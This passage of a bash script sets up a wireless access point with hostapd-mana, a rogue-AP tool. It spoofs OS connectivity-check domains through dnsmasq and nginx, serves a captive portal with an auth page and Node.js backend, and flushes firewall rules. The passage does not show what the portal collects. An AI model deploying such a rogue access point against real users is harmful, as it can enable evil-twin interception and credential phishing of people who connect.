    echo "[*] ✅ Endpoint testing completed"
    
    # Check if all tests passed
    if [ "$apple_response" = "200" ] && [ "$apple_success_response" = "200" ] && [ "$chrome_response" = "204" ] && [ "$samsung_response" = "204" ] && [ "$windows_response" = "200" ] && [ "$firefox_response" = "302" ] && [ "$auth_response" = "200" ] && [ "$success_response" = "200" ] && [ "$domain_test" = "302" ] && [ "$youtube_test" = "200" ]; then
        echo "[*] 🎉 ALL TESTS PASSED! Captive portal should work correctly."
        return 0
    else
        echo "[!] ⚠️ Some tests failed. Please check the configuration."
        return 1
    fi
}
# === Debug Hostapd Configuration ===
debug_hostapd() {
    echo "[*] 🔍 Debugging hostapd configuration..."
    
    if [ -f "$HOSTAPD_CONF" ]; then
        echo "    → Hostapd config file exists: $HOSTAPD_CONF"
        
        # Hapus opsi captive_portal jika ada (karena tidak didukung oleh hostapd-mana)
        if grep -q "captive_portal" "$HOSTAPD_CONF"; then
            echo "    → Removing unsupported captive_portal option from hostapd config..."
            sed -i '/captive_portal/d' "$HOSTAPD_CONF"
        fi
        
        # Hapus opsi auth_server jika ada (karena tidak diperlukan untuk captive portal sederhana)
        if grep -q "auth_server" "$HOSTAPD_CONF"; then
            echo "    → Removing auth_server options from hostapd config..."
            sed -i '/auth_server/d' "$HOSTAPD_CONF"
        fi
        
        echo "    ✅ Hostapd configuration cleaned up"
    else
        echo "    → ⚠️ Hostapd config file not found: $HOSTAPD_CONF"
    fi
}
# === Debug DNS Configuration ===
debug_dns() {
    echo "[*] 🔍 Debugging DNS configuration..."
    
    # Check if dnsmasq is running
    if pgrep dnsmasq > /dev/null; then
        echo "    ✅ dnsmasq is running"
        
        # Test DNS resolution
        echo "    → Testing DNS resolution..."
        local dns_test=$(nslookup captive.apple.com 10.235.100.1 2>/dev/null)
        if echo "$dns_test" | grep -q "10.235.100.1"; then
            echo "    ✅ DNS resolution for captive.apple.com works correctly"
        else
            echo "    ❌ DNS resolution for captive.apple.com failed"
            echo "    → DNS response: $dns_test"
        fi
    else
        echo "    ❌ dnsmasq is not running"
        # Try to start dnsmasq manually
        echo "    → Trying to start dnsmasq manually..."
        dnsmasq --conf-file=$DNSMASQ_CONF
        if [ $? -eq 0 ]; then
            echo "    ✅ dnsmasq started successfully"
        else
            echo "    ❌ Failed to start dnsmasq manually"
        fi
    fi
}
# === Debug Network Configuration ===
debug_network() {
    echo "[*] 🔍 Debugging network configuration..."
    
    # Check if interface is up
    if ip link show "$IFACE" | grep -q "state UP"; then
        echo "    ✅ Interface $IFACE is up"
    else
        echo "    ❌ Interface $IFACE is down"
        # Try to bring it up
        echo "    → Trying to bring interface up..."
        ip link set $IFACE up
        sleep 3
        if ip link show "$IFACE" | grep -q "state UP"; then
            echo "    ✅ Interface $IFACE is now up"
        else
            echo "    ❌ Failed to bring interface $IFACE up"
            # Try rfkill unblock
            echo "    → Trying to unblock with rfkill..."
            rfkill unblock wifi
            sleep 2
            ip link set $IFACE up
            sleep 2
            if ip link show "$IFACE" | grep -q "state UP"; then
                echo "    ✅ Interface $IFACE is now up after rfkill unblock"
            else
                echo "    ❌ Still failed to bring interface $IFACE up"
            fi
        fi
    fi
    
    # Check if IP address is assigned
    if ip addr show "$IFACE" | grep -q "10.235.100.1"; then
        echo "    ✅ IP address 10.235.100.1 is assigned to $IFACE"
    else
        echo "    ❌ IP address 10.235.100.1 is not assigned to $IFACE"
    fi
    
    # Check if IP forwarding is enabled
    if [ "$(cat /proc/sys/net/ipv4/ip_forward)" = "1" ]; then
        echo "    ✅ IP forwarding is enabled"
    else
        echo "    ❌ IP forwarding is disabled"
    fi
}
# === Force Restart Nginx (AGGRESSIVE VERSION) ===
force_restart_nginx() {
    echo "[*] 🔄 Force restarting nginx..."
    
    # Test nginx configuration first
    echo "    → Testing nginx configuration..."
    nginx -t
    if [ $? -ne 0 ]; then
        echo "    ❌ Nginx configuration test failed"
        echo "    → Check /var/log/nginx/error.log for details"
        # Try to fix common nginx configuration issues
        echo "    → Attempting to fix nginx configuration..."
        sed -i 's/www\.google\.com/_/g' /etc/nginx/sites-available/default
        nginx -t
        if [ $? -ne 0 ]; then
            echo "    ❌ Still failed after attempted fix"
            return 1
        fi
    fi
    
    echo "    ✅ Nginx configuration test passed"
    
    # Kill ALL nginx processes aggressively
    echo "    → Aggressively stopping nginx processes..."
    # Use systemd restart to avoid killing system-managed processes
    echo "    → Restarting nginx via systemctl to avoid aggressive pkill..."
    systemctl restart nginx || {
        echo "    → systemctl restart failed, attempting direct start..."
        # Try to start nginx directly as a fallback
        nginx || true
    }
    sleep 2
    
    # Wait for nginx to start
    sleep 2
    
    # Check status
    if pgrep nginx > /dev/null || systemctl is-active --quiet nginx; then
        echo "    ✅ Nginx restarted successfully"
        
        # Verify nginx is listening on port 80
        if netstat -tlnp 2>/dev/null | grep -q ":80.*nginx"; then
            echo "    ✅ Nginx is listening on port 80"
        elif ss -tlnp 2>/dev/null | grep -q ":80.*nginx"; then
            echo "    ✅ Nginx is listening on port 80"
        else
            echo "    ❌ Nginx is not listening on port 80"
            return 1
        fi
    else
        echo "    ❌ Failed to restart nginx"
        echo "    → Checking nginx error log:"
        tail -10 /var/log/nginx/error.log 2>/dev/null || echo "No error log found"
        return 1
    fi
}
# === Main Execution ===
echo "[*] 🔍 Detecting RTL8814AU wireless interface..."
IFACE=$(detect_rtl8814au_interface)
if [ $? -ne 0 ] || [ -z "$IFACE" ]; then
    echo "[!] ❌ Failed to detect RTL8814AU wireless interface"
    # Continue anyway with default interface for testing
    IFACE="wlx00c0cab84be1"
    echo "[*] 🎯 Using default interface: $IFACE"
else
    echo "[*] 🎯 Interface detected: $IFACE"
    driver_info=$(ethtool -i "$IFACE" 2>/dev/null | grep -i "driver\|firmware" | grep -i "8814\|rtl" 2>/dev/null)
    if [ -n "$driver_info" ]; then
        echo "[*] 📋 Driver info: $driver_info"
    fi
fi
echo "[*] 🔍 Detecting hostapd-mana directory..."
HOSTAPD_DIR=$(detect_hostapd_path)
if [ $? -ne 0 ] || [ -z "$HOSTAPD_DIR" ]; then
    echo "[!] ⚠️ hostapd-mana directory not found. Falling back to system hostapd if available."
    # Try common system hostapd locations
    if command -v hostapd >/dev/null 2>&1; then
        SYSTEM_HOSTAPD=$(command -v hostapd)
        echo "    → Found system hostapd at: $SYSTEM_HOSTAPD"
        HOSTAPD_DIR="$(dirname "$SYSTEM_HOSTAPD")"
        # Use bundled hostapd.conf if present in repo configs
        if [ -f "/home/rakasatryo/hostdirect/nginx/configs/hostapd.conf" ]; then
            HOSTAPD_CONF="/home/rakasatryo/hostdirect/nginx/configs/hostapd.conf"
            echo "    → Using hostapd config: $HOSTAPD_CONF"
        fi
    else
        echo "    → No hostapd found on system. Continuing without hostapd; AP will not start."
        HOSTAPD_DIR=""
    fi
else
    echo "[*] 🎯 hostapd directory: $HOSTAPD_DIR"
fi
echo "[*] 🌐 Setting up interface $IFACE with IP $GATEWAY..."
# Stop services that might interfere
systemctl stop NetworkManager wpa_supplicant || true
nmcli device set $IFACE managed no 2>/dev/null || true

# Fast interface setup
ip addr flush dev $IFACE
ip addr add $GATEWAY$NETMASK dev $IFACE
ip link set $IFACE up
iw dev $IFACE set power_save off
sleep 1 # Short wait for interface
# Wait for interface to be ready
sleep 3
# Debug configurations
debug_hostapd
# Create device-specific files
create_device_files
# Create success page
create_success_page
# Check and create auth page if needed
check_auth_page
# Configure services
configure_dnsmasq_universal
configure_nginx_universal
echo "[*] 🔄 Starting dnsmasq..."
pkill dnsmasq 2>/dev/null
dnsmasq --conf-file=$DNSMASQ_CONF
if [ $? -eq 0 ]; then
    echo "    ✅ dnsmasq started successfully with config: $DNSMASQ_CONF"
else
    echo "    ❌ Failed to start dnsmasq"
fi
echo "[*] 🔄 Restarting nginx..."
systemctl stop nginx 2>/dev/null
systemctl start nginx
systemctl status nginx --no-pager | grep Active
# Force restart nginx
force_restart_nginx
echo "[*] 🧹 Cleaning iptables rules..."
iptables -F
iptables -X
iptables -t nat -F
iptables -t mangle -F
echo "[*] 🧹 Cleaning ip6tables rules..."
ip6tables -F
ip6tables -X
ip6tables -P INPUT DROP
ip6tables -P FORWARD DROP
ip6tables -P OUTPUT DROP
# Setup network rules
setup_iptables_universal
echo "[*] 🔋 Disabling power save on $IFACE..."
iw dev $IFACE set power_save off
# Debug configurations
debug_dns
debug_network

# Test endpoints
test_endpoints

echo "[*] 🚀 Starting Node.js captive portal backend..."
if [ -x "$NODE_APP" ]; then
    (cd /home/agent6/autoredirect/captive && nohup ./start-server.sh > /var/log/start-hostapd-mana.log 2>&1 &)
    echo "    ✅ Node.js server started (log: /var/log/start-hostapd-mana.log)"
else
    echo "    ⚠️ Node.js app not found at $NODE_APP, skipping..."
fi

echo "[*] 🚀 Starting hostapd-mana..."
echo "[*] 🚀 Starting hostapd (if available)..."
if [ -z "$HOSTAPD_DIR" ]; then
    echo "    ⚠️ No hostapd available; skipping AP startup"
    HOSTAPD_PID=0
else
    # If HOSTAPD_DIR contains system binary directory (like /usr/sbin), run hostapd from there
    if [ -x "$HOSTAPD_DIR/hostapd" ]; then
        HOSTAPD_BIN="$HOSTAPD_DIR/hostapd"
    elif command -v hostapd >/dev/null 2>&1; then
        HOSTAPD_BIN=$(command -v hostapd)
    else
        HOSTAPD_BIN=""
    fi

    if [ -n "$HOSTAPD_BIN" ]; then
        echo "    → Starting hostapd with config: $HOSTAPD_CONF"
        nohup "$HOSTAPD_BIN" "$HOSTAPD_CONF" > /var/log/hostapd-mana.log 2>&1 &
        HOSTAPD_PID=$!
    else
        echo "    ❌ hostapd executable not found; skipping AP startup"
        HOSTAPD_PID=0
    fi
fi

# Tunggu sebentar untuk memastikan hostapd dimulai
sleep 5

# Periksa apakah hostapd masih berjalan
if kill -0 $HOSTAPD_PID 2>/dev/null; then
    echo "    ✅ hostapd-mana started successfully (PID: $HOSTAPD_PID)"
    echo "    📋 Logs are being saved to /var/log/hostapd-mana.log"
    echo "    📋 To view logs in real-time: tail -f /var/log/hostapd-mana.log"
    echo "    🛑 To stop hostapd: sudo kill $HOSTAPD_PID"
else
    if [ "$HOSTAPD_PID" -eq 0 ]; then
        echo "    ⚠️ hostapd was not started (no binary available)"
    else
        echo "    ❌ hostapd-mana failed to start"
        echo "    📋 Check logs at /var/log/hostapd-mana.log for details"
        # Tampilkan beberapa baris terakhir dari log untuk debugging
        if [ -f "/var/log/hostapd-mana.log" ]; then
            echo "    📋 Last 10 lines of hostapd log:"
            tail -10 /var/log/hostapd-mana.log
        fi
        exit 1
    fi
fi

echo "[*] 🎉 Setup completed successfully!"
echo "    📶 Access Point should be running"
echo "    🌐 Captive portal available at http://10.235.100.1"
echo "    📋 Press Ctrl+C to stop"

while kill -0 $HOSTAPD_PID 2>/dev/null; do
    sleep 1
done

echo "    ❌ hostapd has stopped"
echo "    📋 Check logs at /var/log/hostapd-mana.log for details"